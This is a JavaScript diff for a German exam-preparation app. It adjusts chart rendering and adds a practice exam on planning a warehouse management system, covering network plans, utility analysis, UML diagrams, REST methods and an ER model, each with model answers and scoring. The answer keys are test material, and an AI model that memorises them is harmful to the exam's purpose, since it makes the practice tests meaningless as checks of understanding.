+      nodes.push({id: 'tk' + t, k: 'text', x, y: 16, t: opt.tickLabel ? opt.tickLabel(t) : String(t), fs: 11, tc: 'text3', w: 20, h: 14});
     }
     const pos = tasks.map((task, i) => ({x0: left + task[1] * unit, x1: left + (task[1] + task[2]) * unit, y: 40 + i * row + row / 2}));
     tasks.forEach((task, i) => {
@@ -3852,10 +4097,13 @@ AP2.pages = function () {};
     return step * pow;
   };
   const grid = (g, paint, cfg, plot, ymax) => {
+    // ymin (nur Liniendiagramme): negative Werte, zum Beispiel kumulierte Zahlungen bei der Amortisation; die Nulllinie wird betont.
+    const ymin = cfg.ymin || 0;
     for (let i = 0; i <= 4; i++) {
       const y = M.t + plot.h - (plot.h * i) / 4;
-      g.appendChild(paint(svg('line', {x1: M.l, x2: M.l + plot.w, y1: y, y2: y}), {s: 'border', sw: 1}));
-      AP2.shapes.text(g, paint, M.l - 8, y, String(Math.round((ymax * i) / 4 * 100) / 100), {anchor: 'end', size: 11, color: 'text3'});
+      const val = ymin + ((ymax - ymin) * i) / 4;
+      g.appendChild(paint(svg('line', {x1: M.l, x2: M.l + plot.w, y1: y, y2: y}), {s: val === 0 && ymin < 0 ? 'text3' : 'border', sw: val === 0 && ymin < 0 ? 1.5 : 1}));
+      AP2.shapes.text(g, paint, M.l - 8, y, String(Math.round(val * 100) / 100), {anchor: 'end', size: 11, color: 'text3'});
     }
     if (cfg.yl) AP2.shapes.text(g, paint, M.l, 16, cfg.yl, {anchor: 'start', size: 12, color: 'text2'});
   };
@@ -3876,7 +4124,8 @@ AP2.pages = function () {};
     const xs = cfg.labels.map((l, i) => M.l + (plot.w * i) / (cfg.labels.length - 1));
     cfg.labels.forEach((label, i) => AP2.shapes.text(g, paint, xs[i], M.t + plot.h + 18, String(label), {size: 12, color: 'text2', max: plot.w / (cfg.labels.length - 1) - 6}));
     cfg.series.forEach((s, j) => {
-      const pts = s.d.map((v, i) => xs[i].toFixed(1) + ',' + (M.t + plot.h - (Math.min(v, ymax) / ymax) * plot.h).toFixed(1));
+      // null = noch kein Wert (zum Beispiel Ist-Linie im Burndown bis heute).
+      const pts = s.d.map((v, i) => (v === null ? null : xs[i].toFixed(1) + ',' + (M.t + plot.h - ((Math.max(Math.min(v, ymax), cfg.ymin || 0) - (cfg.ymin || 0)) / (ymax - (cfg.ymin || 0))) * plot.h).toFixed(1))).filter(Boolean);
       g.appendChild(paint(svg('polyline', {points: pts.join(' ')}), {s: s.k || COLORS[j], sw: 2.5, dash: s.dash}));
     });
   };
@@ -3886,7 +4135,7 @@ AP2.pages = function () {};
       const j = cfg.series.length - 1 - ri;
       const txt = AP2.shapes.text(g, paint, x, 16, s.n, {anchor: 'end', size: 12, color: 'text2'});
       x -= AP2.shapes.width(s.n, 12) + 14;
-      g.appendChild(paint(svg('rect', {x: x + 8, y: 11, width: 11, height: 11, rx: 2}), {f: s.k || COLORS[j]}));
+      g.appendChild(paint(svg('rect', {x: x + 1, y: 11, width: 11, height: 11, rx: 2}), {f: s.k || COLORS[j]}));
       x -= 12;
       return txt;
     });
@@ -20953,6 +21202,2199 @@ AP2.add('exam-info', [
   ['table', ['Prüfung', 'Zeit', 'Punkte'], [['Probeprüfung 2: Planen eines Softwareproduktes', '90 Min', '100'], ['Probeprüfung 2: Entwicklung und Umsetzung von Algorithmen', '90 Min', '100'], ['Probeprüfung 2: Wirtschafts- und Sozialkunde', '60 Min', '100']]],
   ['see', ['exam2-ps', 'exam2-eua', 'exam2-wiso'], 'Direkt starten'],
   ['tip', 'Jeder selbst vergebene Punkt bringt **2 XP**. Ab 50 Punkten in einer Probeprüfung gibt es das Abzeichen **Generalprobe**.'],
+]);
+;
+// content/exam/ps3-1.js
+// Probeprüfung 3, Planen eines Softwareproduktes: NordLog Spedition GmbH, Lagerverwaltung "LagerPilot".
+(function () {
+  // Netzplan: [id, Name, Dauer, FAZ, FEZ, SAZ, SEZ, GP, FP, kritisch]
+  const V = [['a', 'Ist-Analyse', 4, 0, 4, 0, 4, 0, 0, 1], ['b', 'Pflichtenheft', 3, 4, 7, 4, 7, 0, 0, 1], ['c', 'DB-Entwurf', 5, 7, 12, 7, 12, 0, 0, 1],
+    ['d', 'Scanner-App', 8, 7, 15, 14, 22, 7, 7, 0], ['e', 'Backend/API', 10, 12, 22, 12, 22, 0, 0, 1], ['f', 'Tracking-Portal', 6, 12, 18, 20, 26, 8, 8, 0],
+    ['g', 'Integration', 4, 22, 26, 22, 26, 0, 0, 1], ['h', 'Systemtest', 3, 26, 29, 26, 29, 0, 0, 1], ['i', 'Schulung', 2, 26, 28, 27, 29, 1, 1, 0], ['j', 'Go-live', 1, 29, 30, 29, 30, 0, 0, 1]];
+  const P = {a: [90, 195], b: [280, 195], c: [470, 65], d: [470, 325], e: [660, 65], f: [660, 195], g: [850, 65], i: [1040, 65], h: [1040, 195], j: [1230, 195]};
+  const net = (phase, cap) => ({w: 1320, h: 390, keep: 980, cap, nodes: V.map(([id, name, d, faz, fez, saz, sez, gp, fp, crit]) => ({id, k: 'np', x: P[id][0], y: P[id][1],
+    s: phase === 3 && crit ? 'accent' : 'plain', t: Object.assign({nr: id.toUpperCase(), name, d}, phase > 0 ? {faz, fez} : {}, phase > 1 ? {saz, sez} : {}, phase > 2 ? {gp, fp} : {})})),
+  edges: [{a: 'a', b: 'b'}, {a: 'b', b: 'c'}, {a: 'b', b: 'd'}, {a: 'c', b: 'e'}, {a: 'c', b: 'f'}, {a: 'd', b: 'g', via: [[850, 325]]}, {a: 'e', b: 'g'},
+    {a: 'f', b: 'h'}, {a: 'g', b: 'h'}, {a: 'g', b: 'i'}, {a: 'h', b: 'j'}, {a: 'i', b: 'j'}]});
+  const ID = 'exam3-ps';
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 3 (Logistik)', t: 'Planen eines Softwareproduktes: Lagerverwaltung LagerPilot', blocks: []});
+  AP2.exam.start(ID, {minutes: 90, cover: AP2.exam.COVER.ps,
+    hint: 'Realistischer Aufgabensatz im Format der AP2 seit 2021: 4 Handlungsschritte, je 25 Punkte, 90 Minuten. Erst vollständig selbst lösen, dann die Musterlösung mit Diagrammen und Lösungsweg-Präsentation öffnen und ehrlich bewerten.',
+    intro: [
+      ['p', 'Sie sind Mitarbeiterin bzw. Mitarbeiter der **CodeHafen Software GmbH** in Bremen. Ihr Kunde, die **NordLog Spedition GmbH**, betreibt ein Logistikzentrum mit **12.000 Palettenplätzen** und drei Umschlagstandorten. Bisher werden Wareneingang, Einlagerung und Kommissionierung mit Papierlisten und einer veralteten Access-Datenbank organisiert. Fehlbestände fallen oft erst bei der Inventur auf.'],
+      ['p', 'Ihr Team soll das Lagerverwaltungssystem **LagerPilot** entwickeln: Handscanner-App für die Lagermitarbeitenden, Backend mit REST-API, Anbindung an das ERP-System von NordLog und ein Tracking-Portal, in dem Kunden ihre Sendungen verfolgen.'],
+      ['kv', [['Kunde', 'NordLog Spedition GmbH, 220 Mitarbeitende, Zwei-Schicht-Betrieb'], ['Auftragnehmer', 'CodeHafen Software GmbH, Projektteam mit 5 Personen'], ['Budget', '180.000 Euro, Go-live vor dem Weihnachtsgeschäft'], ['Systeme', 'ERP-System (vorhanden), 60 Handscanner (neu), WLAN in der Halle (neu)']]],
+    ]});
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 1: Projekt planen (25 Punkte)',
+    ctx: [['h3', 'Anlage 1: Vorgangsliste LagerPilot (Dauer in Arbeitstagen)'],
+      ['table', ['Nr.', 'Vorgang', 'Dauer', 'Vorgänger'], [['A', 'Ist-Analyse', '4', '-'], ['B', 'Pflichtenheft', '3', 'A'], ['C', 'Datenbankentwurf', '5', 'B'], ['D', 'Scanner-App', '8', 'B'], ['E', 'Backend/API', '10', 'C'],
+        ['F', 'Tracking-Portal', '6', 'C'], ['G', 'Integration', '4', 'D, E'], ['H', 'Systemtest', '3', 'F, G'], ['I', 'Schulung', '2', 'G'], ['J', 'Go-live', '1', 'H, I']]]],
+    tasks: [
+      {pts: 4, topic: 'Projektmerkmale', q: 'Nennen Sie vier Merkmale, die das Vorhaben LagerPilot nach DIN 69901 zu einem Projekt machen, und belegen Sie jedes Merkmal mit einer Angabe aus der Ausgangssituation.',
+        a: ['- **Einmaligkeit / Neuartigkeit:** LagerPilot wird für die Abläufe von NordLog neu entwickelt.', '- **Zeitliche Begrenzung:** fester Endtermin (Go-live vor dem Weihnachtsgeschäft).', '- **Begrenzte Ressourcen:** Budget 180.000 Euro, Team mit 5 Personen.', '- **Klare Zielvorgabe:** papierloser Wareneingang und Kommissionierung, weniger Fehlbestände.', '- Weitere: **Komplexität** (Scanner, ERP, Portal), **Risiko**, **projektspezifische Organisation** (Team aus Kunde und Dienstleister).', 'Je Merkmal mit Beleg 1 Punkt.'],
+        see: ['ps-phasen']},
+      {pts: 8, rows: 8, topic: 'Netzplan', q: 'Erstellen Sie zu Anlage 1 einen Netzplan (Vorgangsknotennetz). Berechnen Sie für alle Vorgänge FAZ, FEZ, SAZ, SEZ und den Gesamtpuffer (GP). Tipp: Notieren Sie die Werte als Tabelle, wenn Sie nicht zeichnen möchten.',
+        a: [['table', ['Vorgang', 'D', 'FAZ', 'FEZ', 'SAZ', 'SEZ', 'GP', 'FP'], V.map(([id, name, d, faz, fez, saz, sez, gp, fp]) => [id.toUpperCase() + ' ' + name, String(d), String(faz), String(fez), String(saz), String(sez), gp ? '**' + gp + '**' : '0', String(fp)])],
+          'Bewertung: Vorwärtsrechnung 3 P, Rückwärtsrechnung 3 P, Puffer 2 P. Folgefehler werden nicht doppelt abgezogen.'],
+        sol: [['walk', {t: 'Netzplan LagerPilot', steps: [
+          {t: '**Ausgangslage:** Jeder Vorgang wird ein Knoten. Pfeile zeigen die Abhängigkeiten aus der Spalte Vorgänger. Oben stehen FAZ | Dauer | FEZ, unten SAZ | GP | SEZ.', b: [['diagram', net(0, 'Knoten mit Dauer, noch ohne Zeiten')]]},
+          {t: '**Vorwärtsrechnung:** FAZ = größter FEZ aller Vorgänger, FEZ = FAZ + Dauer. Bei **G** laufen D (FEZ 15) und E (FEZ 22) zusammen: FAZ(G) = max(15, 22) = **22**. Bei **H**: max(18, 26) = **26**. Bei **J**: max(29, 28) = **29**. Projektdauer: **30 Tage**.', b: [['diagram', net(1, 'Nach der Vorwärtsrechnung')]]},
+          {t: '**Rückwärtsrechnung:** SEZ = kleinster SAZ aller Nachfolger, SAZ = SEZ - Dauer. Start bei J mit SEZ = 30. Bei **G** (Nachfolger H mit SAZ 26 und I mit SAZ 27): SEZ = min(26, 27) = **26**. Bei **C** (Nachfolger E mit 12, F mit 20): **12**. Bei **B** (C mit 7, D mit 14): **7**.', b: [['diagram', net(2, 'Nach der Rückwärtsrechnung')]]},
+          {t: '**Puffer:** GP = SAZ - FAZ. **D: 7**, **F: 8**, **I: 1**, alle anderen 0. Freier Puffer FP = FAZ des Nachfolgers - eigener FEZ: D: 22 - 15 = 7, F: 26 - 18 = 8, I: 29 - 28 = 1. Der kritische Pfad (GP = 0) ist hervorgehoben.', b: [['diagram', net(3, 'Fertiger Netzplan, kritischer Pfad A, B, C, E, G, H, J')]]},
+        ]}]],
+        see: ['ps-netzplan']},
+      {pts: 4, topic: 'Kritischer Pfad', q: 'a) Geben Sie den kritischen Pfad und die Projektdauer an. b) Die Entwicklung der Scanner-App (D) verzögert sich um 5 Tage, das Backend (E) um 2 Tage. Wie wirken sich die Verzögerungen jeweils auf das Projektende aus?',
+        a: ['a) Kritischer Pfad **A - B - C - E - G - H - J**, Dauer 4 + 3 + 5 + 10 + 4 + 3 + 1 = **30 Tage**.', 'b) **D + 5 Tage:** keine Auswirkung, D hat 7 Tage Gesamtpuffer. **E + 2 Tage:** E ist kritisch (GP 0), das Projekt endet **2 Tage später** (Tag 32).', 'Hinweis: Treten beide Verzögerungen ein, gilt: D endet an Tag 20, E an Tag 24; G startet bei max(20, 24) = 24, Projektende Tag 32.'],
+        see: ['ps-netzplan']},
+      {pts: 6, topic: 'Nutzwertanalyse', q: 'NordLog prüft, ob statt der Individualentwicklung die Standardsoftware **LagerMax WMS** gekauft werden soll. Führen Sie mit den Angaben eine Nutzwertanalyse durch und geben Sie eine Empfehlung.',
+        ctx: [['table', ['Kriterium', 'Gewichtung', 'LagerMax WMS (Punkte 1 bis 10)', 'Individualentwicklung (Punkte 1 bis 10)'], [['Funktionsumfang', '35 %', '6', '9'], ['Kosten', '25 %', '8', '4'], ['Anpassbarkeit an Abläufe', '20 %', '3', '10'], ['Support und Wartung', '10 %', '9', '6'], ['Einführungszeit', '10 %', '9', '3']]]],
+        a: [['table', ['Kriterium', 'Gewicht', 'LagerMax gewichtet', 'Individual gewichtet'], [['Funktionsumfang', '0,35', '6 x 0,35 = 2,10', '9 x 0,35 = 3,15'], ['Kosten', '0,25', '2,00', '1,00'], ['Anpassbarkeit', '0,20', '0,60', '2,00'], ['Support', '0,10', '0,90', '0,60'], ['Einführungszeit', '0,10', '0,90', '0,30'], ['**Nutzwert**', '1,00', '**6,50**', '**7,05**']]],
+          'Empfehlung: **Individualentwicklung** (7,05 > 6,50), vor allem wegen Funktionsumfang und Anpassbarkeit an die NordLog-Abläufe. Die Standardsoftware ist günstiger und schneller verfügbar, passt aber schlechter.',
+          'Bewertung: Rechenweg 4 P (je Alternative 2 P), Ergebnis und Empfehlung 2 P.'],
+        sol: [['chart', {kind: 'bar', w: 720, h: 300, labels: ['Funktion', 'Kosten', 'Anpassbar', 'Support', 'Einführung'], series: [{n: 'LagerMax WMS', d: [2.1, 2.0, 0.6, 0.9, 0.9], k: 'text3'}, {n: 'Individualentwicklung', d: [3.15, 1.0, 2.0, 0.6, 0.3], k: 'accent'}], vals: true, ymax: 3.5, yl: 'gewichtete Punkte', cap: 'Gewichtete Teilnutzen: Die Individualentwicklung gewinnt bei Funktionsumfang und Anpassbarkeit deutlich, verliert bei Kosten und Zeit.'}]],
+        see: ['ps-beschaffung', 'ps-kosten']},
+      {pts: 3, topic: 'Make or Buy', q: 'Nennen Sie zwei Schwächen der Nutzwertanalyse und ein Kriterium, das bei der Make-or-buy-Entscheidung zusätzlich betrachtet werden sollte.',
+        a: ['- **Subjektivität:** Gewichtung und Punktevergabe sind Einschätzungen; kleine Änderungen können das Ergebnis drehen (hier: Kosten mit 35 % statt 25 % gewichtet).', '- **Scheingenauigkeit:** Zahlen wie 7,05 wirken exakt, beruhen aber auf groben Schätzungen.', '- Kriterien können sich **überschneiden** (zum Beispiel Kosten und Einführungszeit).', 'Zusätzliche Kriterien: **Gesamtkosten über die Nutzungsdauer (TCO)**, Abhängigkeit vom Hersteller (Lock-in), Know-how im eigenen Haus, strategische Bedeutung, Datenschutz und Hosting.'],
+        see: ['ps-tco']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 2: Anforderungen modellieren (25 Punkte)',
+    intro: 'Im Interview mit dem Lagerleiter wurden folgende Abläufe aufgenommen: Lagermitarbeitende buchen den **Wareneingang** und bearbeiten **Kommissionieraufträge**; in beiden Fällen wird eine **Palette gescannt**. Fehlt bei der Kommissionierung Ware, kann ein **Fehlbestand gemeldet** werden. Mitarbeitende **buchen Lagerplätze um**. Schichtleitungen können alles, was Lagermitarbeitende können, und führen zusätzlich die **Inventur** durch; dabei wird der **Bestand an das ERP-System gemeldet**. Kunden **verfolgen ihre Sendung** im Portal.',
+    tasks: [
+      {pts: 7, rows: 8, topic: 'Use-Case-Diagramm', q: 'Erstellen Sie ein UML-Anwendungsfalldiagramm für LagerPilot mit allen Akteuren, Anwendungsfällen, der Generalisierung sowie den include- und extend-Beziehungen.',
+        a: ['Akteure: **Lagermitarbeiter**, **Schichtleiter** (Generalisierung: erbt von Lagermitarbeiter), **Kunde**, **ERP-System** (Fremdsystem als Akteur).', '- «include»: Wareneingang buchen und Kommissionierauftrag bearbeiten **schließen Palette scannen immer ein**; Inventur durchführen schließt Bestand an ERP melden ein.', '- «extend»: **Fehlbestand melden erweitert** Kommissionierauftrag bearbeiten (nur im Bedarfsfall). Der Pfeil zeigt auf den **Basisfall**.', 'Bewertung: Systemgrenze und Akteure 2 P, Anwendungsfälle 2 P, include/extend mit richtiger Pfeilrichtung 2 P, Generalisierung 1 P.'],
+        sol: [['diagram', {w: 820, h: 470, keep: 680, cap: 'Musterlösung: Anwendungsfalldiagramm LagerPilot', nodes: [
+          {id: 'sys', k: 'group', x: 420, y: 235, w: 520, h: 445, t: 'LagerPilot', s: 'soft'},
+          {id: 'lm', k: 'actor', x: 70, y: 110, t: 'Lagermitarbeiter', w: 40, h: 56}, {id: 'sl', k: 'actor', x: 70, y: 330, t: 'Schichtleiter', w: 40, h: 56},
+          {id: 'erp', k: 'actor', x: 770, y: 270, t: 'ERP-System', w: 40, h: 56}, {id: 'kd', k: 'actor', x: 770, y: 380, t: 'Kunde', w: 40, h: 56},
+          {id: 'u1', k: 'oval', x: 290, y: 70, t: 'Wareneingang buchen', w: 190, h: 46}, {id: 'u2', k: 'oval', x: 290, y: 165, t: 'Kommissionierauftrag bearbeiten', w: 220, h: 50, s: 'accent'},
+          {id: 'u6', k: 'oval', x: 290, y: 260, t: 'Lagerplatz umbuchen', w: 180, h: 46}, {id: 'u5', k: 'oval', x: 290, y: 365, t: 'Inventur durchführen', w: 190, h: 46},
+          {id: 'u3', k: 'oval', x: 560, y: 110, t: 'Palette scannen', w: 160, h: 46}, {id: 'u4', k: 'oval', x: 560, y: 205, t: 'Fehlbestand melden', w: 170, h: 46},
+          {id: 'u8', k: 'oval', x: 560, y: 300, t: 'Bestand an ERP melden', w: 180, h: 46}, {id: 'u7', k: 'oval', x: 560, y: 405, t: 'Sendung verfolgen', w: 170, h: 46},
+        ], edges: [
+          {a: 'lm', b: 'u1', ea: 'none'}, {a: 'lm', b: 'u2', ea: 'none'}, {a: 'lm', b: 'u6', ea: 'none'}, {a: 'sl', b: 'u5', ea: 'none'},
+          {a: 'sl', b: 'lm', via: [[22, 330], [22, 110]], ea: 'tri'}, {a: 'erp', b: 'u8', ea: 'none'}, {a: 'kd', b: 'u7', ea: 'none'},
+          {a: 'u1', b: 'u3', k: 'dash', ea: 'open', t: '«include»'}, {a: 'u2', b: 'u3', k: 'dash', ea: 'open', t: '«include»', lo: [10, 12]},
+          {a: 'u4', b: 'u2', k: 'dash', ea: 'open', t: '«extend»'}, {a: 'u5', b: 'u8', k: 'dash', ea: 'open', t: '«include»'},
+        ]}],
+        ['warn', 'Häufige Fehler: Pfeilrichtung bei «extend» (zeigt zum **Basisfall**), Fremdsysteme vergessen, Abläufe (Reihenfolge) ins Use-Case-Diagramm zeichnen. Reihenfolgen gehören ins Aktivitätsdiagramm.']],
+        see: ['ps-usecase']},
+      {pts: 8, rows: 9, topic: 'Aktivitätsdiagramm', q: 'Modellieren Sie die Kommissionierung als UML-Aktivitätsdiagramm: Der Mitarbeitende ruft einen Auftrag am Scanner ab. Für **jede Position** geht er zum Lagerplatz und scannt ihn; ist es der falsche Platz, erscheint ein Hinweis und er scannt erneut. Dann scannt er den Artikel und gibt die Menge ein. Ist die Menge kleiner als die Sollmenge, meldet er einen Fehlbestand. Sind alle Positionen erledigt, werden **gleichzeitig** der Lieferschein gedruckt und der Bestand gebucht. Danach endet der Ablauf.',
+        a: ['Elemente: Startknoten, Aktionen, **Entscheidungen mit Wächtern** [Platz falsch] / [Platz korrekt], [Menge < Soll] / [sonst], **Schleife** über die Positionen ([weitere Position] zurück zum Merge-Knoten), **Gabelung und Vereinigung** (Fork/Join) für die parallelen Aktionen, Endknoten.', 'Bewertung: Aktionen 2 P, Verzweigungen mit Wächtern 2 P, Schleife 2 P, Fork/Join 1 P, Start/Ende 1 P.'],
+        sol: [['diagram', {w: 760, h: 820, keep: 560, cap: 'Musterlösung: Aktivitätsdiagramm Kommissionierung', nodes: [
+          {id: 's', k: 'dot', x: 380, y: 28}, {id: 'a1', k: 'round', x: 380, y: 85, t: 'Auftrag am Scanner abrufen', w: 240, h: 40, s: 'accent'},
+          {id: 'm1', k: 'diamond', x: 380, y: 148, w: 34, h: 34, t: ''}, {id: 'a2', k: 'round', x: 380, y: 210, t: 'Zum Platz gehen, Platz scannen', w: 260, h: 40, s: 'accent'},
+          {id: 'd1', k: 'diamond', x: 380, y: 280, w: 40, h: 40, t: ''}, {id: 'h1', k: 'round', x: 620, y: 280, t: 'Hinweis anzeigen', w: 170, h: 40, s: 'accent'},
+          {id: 'a3', k: 'round', x: 380, y: 355, t: 'Artikel scannen, Menge eingeben', w: 270, h: 40, s: 'accent'},
+          {id: 'd2', k: 'diamond', x: 380, y: 425, w: 40, h: 40, t: ''}, {id: 'a4', k: 'round', x: 620, y: 425, t: 'Fehlbestand melden', w: 180, h: 40, s: 'accent'},
+          {id: 'm2', k: 'diamond', x: 380, y: 495, w: 34, h: 34, t: ''}, {id: 'd3', k: 'diamond', x: 380, y: 560, w: 40, h: 40, t: ''},
+          {id: 'f1', k: 'bar', x: 380, y: 625, w: 340, h: 8}, {id: 'p1', k: 'round', x: 250, y: 685, t: 'Lieferschein drucken', w: 190, h: 40, s: 'accent'},
+          {id: 'p2', k: 'round', x: 510, y: 685, t: 'Bestand buchen', w: 170, h: 40, s: 'accent'}, {id: 'j1', k: 'bar', x: 380, y: 745, w: 340, h: 8}, {id: 'e', k: 'ring', x: 380, y: 795},
+        ], edges: [
+          {a: 's', b: 'a1'}, {a: 'a1', b: 'm1'}, {a: 'm1', b: 'a2'}, {a: 'a2', b: 'd1'}, {a: 'd1', b: 'h1', t: '[Platz falsch]'}, {a: 'h1', b: 'a2', via: [[620, 210]]},
+          {a: 'd1', b: 'a3', t: '[Platz korrekt]', lo: [52, 0]}, {a: 'a3', b: 'd2'}, {a: 'd2', b: 'a4', t: '[Menge < Soll]'}, {a: 'a4', b: 'm2', via: [[620, 495]]},
+          {a: 'd2', b: 'm2', t: '[sonst]', lo: [30, 0]}, {a: 'm2', b: 'd3'}, {a: 'd3', b: 'm1', via: [[130, 560], [130, 148]], t: '[weitere Position]', lo: [-50, 0]},
+          {a: 'd3', b: 'f1', t: '[alle erledigt]', lo: [50, 0]}, {a: [250, 629], b: 'p1'}, {a: [510, 629], b: 'p2'},
+          {a: 'p1', b: [250, 741]}, {a: 'p2', b: [510, 741]}, {a: 'j1', b: 'e'},
+        ]}],
+        ['tip', 'Rauten haben zwei Rollen: **Verzweigung** (ein Eingang, mehrere bewachte Ausgänge) und **Zusammenführung** (mehrere Eingänge, ein Ausgang). Die Schleife braucht einen Zusammenführungsknoten vor der ersten Aktion der Position.']],
+        see: ['ps-aktivitaet']},
+      {pts: 6, topic: 'Klassendiagramm', q: 'Anlage 2 zeigt einen Ausschnitt des Klassendiagramms. a) Erläutern Sie die Multiplizitäten zwischen Lagerplatz und Palette. b) Erklären Sie am Beispiel Auftrag und Auftragsposition den Unterschied zwischen Komposition und Aggregation. c) Es gibt Kühlplätze mit zusätzlicher Solltemperatur. Wie bilden Sie das im Modell ab?',
+        ctx: [['h3', 'Anlage 2: Klassendiagramm (Ausschnitt)'], ['diagram', {w: 820, h: 330, keep: 680, cap: 'Klassendiagramm LagerPilot (Ausschnitt)', nodes: [
+          {id: 'la', k: 'cls', x: 100, y: 80, w: 170, t: {name: 'Lager', attrs: ['- standort: String']}}, {id: 'lp', k: 'cls', x: 370, y: 80, w: 200, t: {name: 'Lagerplatz', attrs: ['- platzNr: String', '- maxGewicht: int']}},
+          {id: 'pa', k: 'cls', x: 660, y: 80, w: 180, t: {name: 'Palette', attrs: ['- nve: String', '- gewicht: int']}}, {id: 'ar', k: 'cls', x: 660, y: 250, w: 190, t: {name: 'Artikel', attrs: ['- artikelNr: String', '- bezeichnung: String']}},
+          {id: 'po', k: 'cls', x: 370, y: 250, w: 200, t: {name: 'Auftragsposition', attrs: ['- menge: int']}}, {id: 'au', k: 'cls', x: 100, y: 250, w: 170, t: {name: 'Auftrag', attrs: ['- auftragNr: int', '- datum: Date']}},
+        ], edges: [
+          {a: 'la', b: 'lp', sa: 'diaf', ea: 'none', ta: '1', tb: '1..*'}, {a: 'lp', b: 'pa', ea: 'none', ta: '0..1', tb: '0..1'}, {a: 'pa', b: 'ar', ea: 'none', ta: '*', tb: '1'},
+          {a: 'au', b: 'po', sa: 'diaf', ea: 'none', ta: '1', tb: '1..*'}, {a: 'po', b: 'ar', ea: 'none', ta: '*', tb: '1'},
+        ]}]],
+        a: ['a) Ein **Lagerplatz trägt keine oder eine Palette** (0..1, frei oder belegt). Eine **Palette steht auf keinem oder einem Lagerplatz** (0 zum Beispiel während des Transports oder im Wareneingang).', 'b) **Komposition** (gefüllte Raute): Die Positionen sind **existenzabhängig**; wird der Auftrag gelöscht, werden seine Positionen mit gelöscht, eine Position gehört genau zu einem Auftrag. Bei einer **Aggregation** (leere Raute) könnten die Teile auch ohne das Ganze existieren (zum Beispiel Paletten in einer Tour).', 'c) **Vererbung (Generalisierung):** Klasse **Kuehlplatz** erbt von Lagerplatz und ergänzt das Attribut **- solltemperatur: double**. Ein Kühlplatz ist ein Lagerplatz ("ist-ein"-Beziehung) und kann überall verwendet werden, wo ein Lagerplatz erwartet wird.'],
+        sol: [['diagram', {w: 520, h: 230, cap: 'Erweiterung zu c): Kuehlplatz spezialisiert Lagerplatz (Dreieck zeigt zur Oberklasse)', nodes: [
+          {id: 'lp', k: 'cls', x: 260, y: 55, w: 200, t: {name: 'Lagerplatz', attrs: ['- platzNr: String', '- maxGewicht: int']}},
+          {id: 'kp', k: 'cls', x: 260, y: 180, w: 220, s: 'accent', t: {name: 'Kuehlplatz', attrs: ['- solltemperatur: double']}},
+        ], edges: [{a: 'kp', b: 'lp', ea: 'tri'}]}]],
+        see: ['ps-klassen']},
+      {pts: 4, topic: 'REST-Schnittstelle', q: 'Die Scanner-App kommuniziert über eine REST-API mit dem Backend. Geben Sie für die folgenden Fälle die HTTP-Methode bzw. den Statuscode an: a) Lagerplatz B-12-03 abfragen, b) eine neue Palette anlegen (Methode und erwarteter Statuscode bei Erfolg), c) die Palette existiert nicht, d) den Bestand einer Palette vollständig ersetzen.',
+        a: ['a) **GET** /lagerplaetze/B-12-03 (Antwort 200 OK)', 'b) **POST** /paletten, Erfolg: **201 Created** (mit Location-Header)', 'c) **404 Not Found**', 'd) **PUT** /paletten/{nve} (vollständig ersetzen; PATCH wäre teilweise ändern)'],
+        see: ['eua-webapi']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 3: Daten modellieren und Qualität sichern (25 Punkte)',
+    tasks: [
+      {pts: 8, rows: 9, topic: 'ER-Modell', q: 'Für das Tracking-Portal gilt: Ein **Kunde** (Kundennummer, Firma, Ort) erteilt beliebig viele **Sendungen** (Sendungsnummer, Gewicht, Status); jede Sendung gehört zu genau einem Kunden. Eine Sendung kann wegen Umladung auf **mehreren Touren** transportiert werden, eine Tour (Tournummer, Datum, Kennzeichen) transportiert viele Sendungen; je Sendung und Tour wird die **Stoppnummer** gespeichert. Jede Tour hat genau einen **Fahrer** (Personalnummer, Name), ein Fahrer fährt viele Touren. a) Erstellen Sie ein ER-Modell mit Kardinalitäten. b) Überführen Sie es in ein relationales Modell mit Primär- und Fremdschlüsseln.',
+        a: ['a) Entitäten Kunde, Sendung, Tour, Fahrer. Beziehungen: Kunde **1 : n** Sendung, Sendung **m : n** Tour (Attribut Stoppnummer an der Beziehung), Fahrer **1 : n** Tour.', 'b) Relationen (PK unterstrichen bzw. markiert):', '- **kunde** (PK kundennr, firma, ort)', '- **sendung** (PK sendungsnr, gewicht, status, FK kundennr)', '- **fahrer** (PK personalnr, name)', '- **tour** (PK tournr, datum, kennzeichen, FK personalnr)', '- **tour_sendung** (PK/FK tournr, PK/FK sendungsnr, stoppnr): die m:n-Beziehung wird zur eigenen Tabelle mit zusammengesetztem Primärschlüssel.', 'Bewertung: ERM 4 P (Entitäten, Beziehungen, Kardinalitäten), Relationen 4 P (1:n als FK auf der n-Seite, m:n als Zwischentabelle).'],
+        sol: [['walk', {t: 'Vom Text zum Relationenmodell', steps: [
+          {t: '**Schritt 1, ER-Modell (Chen-Notation):** Substantive werden Entitäten, Verben Beziehungen. Das Attribut Stoppnummer gehört zu keiner Entität allein, sondern zur Beziehung "transportiert".', b: [['diagram', {w: 760, h: 330, keep: 600, cap: 'ER-Modell mit Kardinalitäten', nodes: [
+            {id: 'k', k: 'box', x: 110, y: 70, w: 170, h: 56, t: ['Kunde', 'kundennr, firma, ort'], s: 'accent', b: true}, {id: 'r1', k: 'diamond', x: 330, y: 70, w: 120, h: 56, t: 'erteilt'},
+            {id: 's', k: 'box', x: 570, y: 70, w: 210, h: 56, t: ['Sendung', 'sendungsnr, gewicht, status'], s: 'accent', b: true}, {id: 'r2', k: 'diamond', x: 570, y: 175, w: 170, h: 60, t: ['transportiert', '(stoppnr)']},
+            {id: 't', k: 'box', x: 570, y: 280, w: 220, h: 56, t: ['Tour', 'tournr, datum, kennzeichen'], s: 'accent', b: true}, {id: 'r3', k: 'diamond', x: 330, y: 280, w: 110, h: 56, t: 'fährt'},
+            {id: 'f', k: 'box', x: 110, y: 280, w: 170, h: 56, t: ['Fahrer', 'personalnr, name'], s: 'accent', b: true},
+          ], edges: [{a: 'k', b: 'r1', ea: 'none', ta: '1'}, {a: 'r1', b: 's', ea: 'none', tb: 'n'}, {a: 's', b: 'r2', ea: 'none', ta: 'm'}, {a: 'r2', b: 't', ea: 'none', tb: 'n'},
+            {a: 'f', b: 'r3', ea: 'none', ta: '1'}, {a: 'r3', b: 't', ea: 'none', tb: 'n'}]}]]},
